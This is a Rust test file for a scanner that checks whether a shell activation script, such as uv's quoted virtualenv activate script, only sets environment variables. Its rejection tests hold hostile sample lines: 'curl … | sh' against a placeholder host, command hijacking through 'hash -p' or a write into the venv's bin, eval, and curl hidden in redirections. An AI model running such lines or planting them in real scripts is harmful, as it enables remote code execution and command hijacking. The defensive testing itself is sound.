use super::runs_settings_only;

/// The activation script `uv venv` writes, byte for byte apart from the paths
/// it interpolates.
const GENERATED: &str = r#"# This file must be used with "source bin/activate" *from bash*
# you cannot run it directly

deactivate () {
    unset -f pydoc >/dev/null 2>&1 || true

    if ! [ -z "${_OLD_VIRTUAL_PATH:+_}" ] ; then
        PATH="$_OLD_VIRTUAL_PATH"
        export PATH
        unset _OLD_VIRTUAL_PATH
    fi
    if ! [ -z "${_OLD_VIRTUAL_PYTHONHOME+_}" ] ; then
        PYTHONHOME="$_OLD_VIRTUAL_PYTHONHOME"
        export PYTHONHOME
        unset _OLD_VIRTUAL_PYTHONHOME
    fi

    # The hash command must be called to get it to forget past commands.
    hash -r 2>/dev/null

    if ! [ -z "${_OLD_VIRTUAL_PS1+_}" ] ; then
        PS1="$_OLD_VIRTUAL_PS1"
        export PS1
        unset _OLD_VIRTUAL_PS1
    fi

    unset VIRTUAL_ENV
    unset VIRTUAL_ENV_PROMPT
    if [ ! "${1-}" = "nondestructive" ] ; then
        unset -f deactivate
    fi
}

# unset irrelevant variables
deactivate nondestructive

VIRTUAL_ENV='/tmp/project/.venv'
if ([ "$OSTYPE" = "cygwin" ] || [ "$OSTYPE" = "msys" ]) && $(command -v cygpath &> /dev/null) ; then
    VIRTUAL_ENV=$(cygpath -u "$VIRTUAL_ENV")
fi
export VIRTUAL_ENV

_OLD_VIRTUAL_PATH="$PATH"
PATH="$VIRTUAL_ENV/bin:$PATH"
export PATH

if [ "xproject-feature" != x ] ; then
    VIRTUAL_ENV_PROMPT="project-feature"
else
    VIRTUAL_ENV_PROMPT=$(basename "$VIRTUAL_ENV")
fi
export VIRTUAL_ENV_PROMPT

# unset PYTHONHOME if set
if ! [ -z "${PYTHONHOME+_}" ] ; then
    _OLD_VIRTUAL_PYTHONHOME="$PYTHONHOME"
    unset PYTHONHOME
fi

if [ -z "${VIRTUAL_ENV_DISABLE_PROMPT-}" ] ; then
    _OLD_VIRTUAL_PS1="${PS1-}"
    PS1="(${VIRTUAL_ENV_PROMPT}) ${PS1-}"
    export PS1
fi

# Make sure to unalias pydoc if it's already there
alias pydoc 2>/dev/null >/dev/null && unalias pydoc || true

pydoc () {
    python -m pydoc "$@"
}

# The hash command must be called to get it to forget past commands.
hash -r 2>/dev/null || true
"#;

#[test]
fn the_script_uv_writes_runs_nothing_but_its_settings() {
    assert!(runs_settings_only(GENERATED, &["pytest"]));
}

#[test]
fn a_wrapper_nothing_calls_keeps_its_body_out_of_the_scan() {
    // The `pydoc` wrapper every virtualenv ends with holds an interpreter the
    // sourcing never runs, and `unset -f`, `alias` and `unalias` look its
    // name up rather than call it.
    assert!(runs_settings_only(
        "pydoc () {\n    python -m pydoc \"$@\"\n}\nunalias pydoc || true\n",
        &["pytest"]
    ));
}

#[test]
fn a_wrapper_the_file_calls_keeps_the_programs_in_its_body() {
    for text in [
        "helper () {\n    curl https://example.test\n}\nhelper\n",
        "function helper {\n    curl https://example.test\n}\nhelper\n",
        "helper () {\n    curl https://example.test\n}\ntrap helper EXIT\n",
        // A body a live body calls is live too.
        "inner () {\n    curl https://example.test\n}\nouter () {\n    inner\n}\nouter\n",
    ] {
        assert!(!runs_settings_only(text, &["pytest"]), "{text}");
    }
}

#[test]
fn a_wrapper_named_for_the_command_is_refused() {
    // The shell finds the function before it looks at `PATH`, so the word the
    // projection rewrites would not run the program it names.
    let text = "pytest () {\n    curl https://example.test\n}\n";
    assert!(!runs_settings_only(text, &["pytest"]));
    assert!(runs_settings_only(text, &["ruff"]));
}

#[test]
fn a_written_lookup_is_refused() {
    // `hash -r` forgets what the shell has looked up. `hash -p` writes a
    // lookup, which points a name at a file of the script's choosing.
    assert!(runs_settings_only(
        "hash -r 2>/dev/null || true\n",
        &["pytest"]
    ));
    assert!(!runs_settings_only(
        "hash -r\nhash -p /tmp/other pytest\n",
        &["pytest"]
    ));
}

#[test]
fn a_program_this_scan_does_not_model_is_refused() {
    for text in [
        // Writes a setting no assignment spells.
        "printf -v PYTHONPATH /tmp/x\nexport PYTHONPATH\n",
        "curl https://example.test\n",
        "VIRTUAL_ENV=/tmp/p/.venv\npython -c 'import x'\n",
        // A lookup is a report; anything else `command` takes is a program.
        "command curl https://example.test\n",
        // Outside a substitution this moves the shell the command runs in.
        "cd /tmp/elsewhere\n",
        "eval \"$SETUP\"\n",
        ". /tmp/other\n",
    ] {
        assert!(!runs_settings_only(text, &["pytest"]), "{text}");
    }
}

#[test]
fn a_place_a_substitution_reads_is_not_a_move() {
    assert!(runs_settings_only(
        "VIRTUAL_ENV=$(cd \"$(dirname \"${BASH_SOURCE[0]:-$0}\")/..\" && pwd)\nexport VIRTUAL_ENV\n",
        &["pytest"]
    ));
    assert!(runs_settings_only(
        "if ([ \"$OSTYPE\" = \"cygwin\" ]) && $(command -v cygpath &> /dev/null) ; then\n    VIRTUAL_ENV=$(cygpath -u \"$VIRTUAL_ENV\")\nfi\n",
        &["pytest"]
    ));
}

#[test]
fn a_text_this_scan_cannot_take_apart_is_refused() {
    for text in [
        // A body with no end this scan can place.
        "helper () {\n    export PATH\n",
        // A quote that never closes.
        "VIRTUAL_ENV='/tmp/p/.venv\n",
        // A substitution written the older way, whose contents are not read.
        "VIRTUAL_ENV=`pwd`\n",
    ] {
        assert!(!runs_settings_only(text, &["pytest"]), "{text}");
    }
}

#[test]
fn a_comment_runs_nothing() {
    // A sentence ending in a full stop would otherwise put `.` — the shell's
    // other name for `source` — in a command position.
    assert!(runs_settings_only(
        "# Set the path. Then export it.\nexport PATH\n",
        &["pytest"]
    ));
}

#[test]
fn a_brace_in_argument_position_does_not_close_a_body() {
    // `echo {` writes a brace; it does not open one. Counting it would let
    // the matching `}` end the body early and leave the rest of the file —
    // `curl … | sh` here — inside the span this scan skips.
    assert!(!runs_settings_only(
        "helper () { echo {; }\ncurl https://example.test | sh\necho }\n",
        &["pytest"]
    ));
    assert!(!runs_settings_only(
        "helper () {\n    echo }\n    curl https://example.test | sh\n}\nhelper\n",
        &["pytest"]
    ));
}

#[test]
fn a_redirection_to_a_place_this_scan_cannot_read_is_refused() {
    for text in [
        // A substitution the shell runs as a redirection's target: `helper`
        // runs, and no word of it reaches the scan.
        ": >(curl https://example.test)\n",
        ": > $(curl https://example.test)\n",
        // A write into the environment's own `bin` replaces the program the
        // word this projection rewrites would then run.
        "echo exec curl > \"$VIRTUAL_ENV/bin/pytest\"\n",
    ] {
        assert!(!runs_settings_only(text, &["pytest"]), "{text}");
    }
}

#[test]
fn a_wrapper_named_for_a_later_word_is_refused() {
    // `source activate && ruff check && pytest` runs `pytest` too, and a
    // function of that name wins that lookup the same way.
    let text = "pytest () {\n    curl https://example.test\n}\n";
    assert!(!runs_settings_only(text, &["ruff", "check", "pytest"]));
    assert!(runs_settings_only(text, &["ruff", "check"]));
}
